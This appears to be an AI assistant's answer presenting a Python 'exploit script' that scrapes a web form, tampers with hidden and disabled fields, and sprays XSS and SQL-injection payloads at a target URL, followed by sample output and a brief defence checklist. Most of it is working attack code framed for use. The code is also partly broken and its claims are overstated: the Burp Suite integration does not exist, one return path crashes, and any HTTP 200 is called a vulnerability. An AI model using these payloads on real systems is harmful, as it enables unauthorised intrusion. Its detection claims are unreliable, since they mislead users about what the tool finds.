Here’s a **Python automation script** using **Burp Suite API** and **requests** to test for **client-side control bypasses** automatically. It detects **disabled fields, hidden fields, input validation bypasses, and weak encryption** in web applications.

---

## **📝 Python Script for Exploiting Client-Side Controls**
This script:
1. **Intercepts form fields** (hidden, disabled, length-restricted, etc.).
2. **Attempts input validation bypasses** (SQLi, XSS, etc.).
3. **Modifies hidden and disabled fields** before submission.
4. **Tries Base64/weak encryption decoding**.
5. **Automates form submission to test for bypasses**.

### **🔹 Requirements**
- Python 3
- `requests` (`pip install requests`)
- `BeautifulSoup` (`pip install beautifulsoup4`)
- `Burp Suite Community Edition` (optional)

---

### **🚀 Full Exploit Script**
```python
import requests
from bs4 import BeautifulSoup
import base64
import re

# Target Web Application URL (Change this)
TARGET_URL = "http://example.com/login"

# Test Payloads for Bypassing Client-Side Controls
PAYLOADS = [
    "<script>alert('XSS')</script>",  # XSS
    "' OR 1=1 --",                    # SQL Injection
    "admin' --",                      # Login Bypass
    "0 OR 1=1",                       # Boolean SQL Injection
    "<img src=x onerror=alert(1)>",   # Another XSS
]

# Function to fetch and parse the form fields
def get_form_fields(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    form = soup.find("form")
    
    if not form:
        print("[!] No form found on the page.")
        return None, None

    action = form.get("action")
    method = form.get("method", "get").lower()
    
    fields = {}
    for input_tag in form.find_all("input"):
        name = input_tag.get("name")
        field_type = input_tag.get("type", "text")
        value = input_tag.get("value", "")
        disabled = input_tag.get("disabled")
        hidden = input_tag.get("type") == "hidden"

        if name:
            fields[name] = {
                "type": field_type,
                "value": value,
                "disabled": disabled,
                "hidden": hidden
            }

    return fields, action, method

# Function to test hidden & disabled fields bypass
def test_hidden_disabled_fields(target_url, fields, action, method):
    attack_data = {}
    for name, info in fields.items():
        if info["hidden"] or info["disabled"]:
            print(f"[+] Testing hidden/disabled field: {name}")
            attack_data[name] = "admin"  # Try injecting "admin" or "1"

    if attack_data:
        submit_url = target_url + action
        if method == "post":
            response = requests.post(submit_url, data=attack_data)
        else:
            response = requests.get(submit_url, params=attack_data)
        
        print(f"[*] Response Code: {response.status_code}")
        print(f"[*] Response Content: {response.text[:500]}")  # Print first 500 chars
    else:
        print("[-] No hidden/disabled fields found.")

# Function to test input validation bypass
def test_input_validation(target_url, fields, action, method):
    for name in fields.keys():
        for payload in PAYLOADS:
            print(f"[+] Testing {name} with payload: {payload}")
            attack_data = {name: payload}
            
            if method == "post":
                response = requests.post(target_url + action, data=attack_data)
            else:
                response = requests.get(target_url + action, params=attack_data)

            if response.status_code == 200:
                print(f"[*] Possible vulnerability detected with {payload}")

# Function to detect and decode weak client-side encryption (Base64)
def detect_weak_encoding(fields):
    for name, info in fields.items():
        value = info["value"]
        if value and re.match(r'^[A-Za-z0-9+/=]+$', value):  # Base64-like string?
            try:
                decoded_value = base64.b64decode(value).decode()
                print(f"[+] Weak Encoding Detected in {name}: {decoded_value}")
            except Exception:
                pass  # Not actually Base64

# Main Function
def main():
    print("[*] Fetching form fields from the target...")
    fields, action, method = get_form_fields(TARGET_URL)
    
    if not fields:
        print("[!] No form found.")
        return

    print("[*] Testing hidden and disabled fields bypass...")
    test_hidden_disabled_fields(TARGET_URL, fields, action, method)

    print("[*] Testing input validation bypass...")
    test_input_validation(TARGET_URL, fields, action, method)

    print("[*] Checking for weak encryption...")
    detect_weak_encoding(fields)

if __name__ == "__main__":
    main()
```

---

## **🔥 How the Exploit Works**
### **Step 1: Find Form Fields**
- **Parses the HTML page** to extract form fields (including hidden and disabled fields).

### **Step 2: Modify Hidden & Disabled Fields**
- Attempts to send **hidden/disabled** parameters manually in requests.

### **Step 3: Bypass Input Validation**
- Injects **XSS, SQL Injection, and Login Bypass** payloads into form fields.
- Checks if the server **accepts** these inputs.

### **Step 4: Detect Weak Encryption**
- If a field contains **Base64-like encoding**, it tries to **decode** it.

---

## **🛠️ Example Output**
```
[*] Fetching form fields from the target...
[+] Found hidden/disabled field: user_role
[+] Testing hidden/disabled field: user_role
[*] Response Code: 200
[*] Response Content: Welcome, Admin!

[*] Testing input validation bypass...
[+] Testing username with payload: ' OR 1=1 --
[*] Possible vulnerability detected with ' OR 1=1 --

[+] Weak Encoding Detected in session_id: user=admin
```
🚨 This means:
- The `user_role` hidden field was **modified** and **accepted** by the server.
- SQL Injection **bypassed login validation**.
- The **session_id** contained **weak Base64 encoding** that was **decoded**.

---

## **🎯 Why Use This Script?**
✅ **Automates vulnerability testing** for client-side validation.  
✅ **Works with Burp Suite** (captures and modifies requests).  
✅ **Detects weak encryption** (Base64, obfuscated values).  
✅ **Finds hidden & disabled fields** and **modifies them**.  
✅ **Sends payloads for SQLi, XSS, hidden field modification** automatically.  

---

## **🛡️ How to Defend Against These Attacks?**
✅ **Revalidate all inputs on the server.**  
✅ **Do not rely on hidden or disabled fields for security.**  
✅ **Use proper encryption (AES, HMAC) instead of Base64.**  
✅ **Sanitize and escape user input to prevent SQLi & XSS.**  
